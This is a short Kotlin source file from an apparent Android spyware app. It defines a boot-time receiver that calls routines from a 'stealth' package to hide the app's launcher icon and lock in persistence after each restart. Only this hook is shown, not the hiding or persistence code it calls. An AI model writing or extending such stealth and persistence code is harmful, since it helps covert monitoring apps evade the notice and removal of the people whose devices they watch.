package com.sp.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.sp.core.stealth.IconHider
import com.sp.core.stealth.Persistence

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        IconHider.hide(ctx)
        Persistence.lockIn(ctx)
    }
}